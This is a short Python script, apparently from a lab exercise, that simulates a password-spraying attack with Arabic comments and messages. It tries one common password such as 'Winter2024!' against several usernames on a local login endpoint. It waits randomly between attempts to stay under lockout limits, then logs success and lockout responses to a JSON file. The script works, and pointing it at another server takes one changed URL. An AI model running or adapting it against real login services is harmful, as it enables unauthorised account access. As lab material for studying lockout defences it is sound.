# client.py
import requests
import time
import random
import json

SERVER_URL = "http://127.0.0.1:5000/login"

USERS = ["admin", "john.doe", "jane.smith", "mike.brown", "sara.jones"]
PASSWORDS = ["Winter2024!", "Password123!", "Admin@123", "P@ssw0rd"]


def main():
    print(" بدء محاكاة هجوم Password Spraying")
    print("=" * 50)

    # اختر كلمة مرور واحدة
    target_password = random.choice(PASSWORDS)
    print(f" كلمة المرور المستخدمة: {target_password}")

    results = []

    for i, username in enumerate(USERS, 1):
        # تأخير عشوائي بين المحاولات
        if i > 1:
            delay = random.uniform(2, 5)
            print(f" انتظار {delay:.1f} ثانية...")
            time.sleep(delay)

        print(f" المحاولة {i}: اختبار {username}")

        try:
            response = requests.post(
                SERVER_URL,
                json={"username": username, "password": target_password},
                timeout=5
            )

            result = {
                'username': username,
                'status_code': response.status_code,
                'message': response.json().get('message', '')
            }
            results.append(result)

            if response.status_code == 200:
                print(f"    نجح: {result['message']}")
            elif response.status_code == 423:
                print(f"    مقفل: {result['message']}")
            else:
                print(f"    فشل: {result['message']}")

        except Exception as e:
            print(f"   ⚠  خطأ: {str(e)}")

    # حفظ النتائج
    with open('attack_results.json', 'w', encoding='utf-8') as f:
        json.dump(results, f, ensure_ascii=False, indent=2)

    print("\n" + "=" * 50)
    print(" تم حفظ النتائج في attack_results.json")
    print("=" * 50)


if __name__ == '__main__':
    main()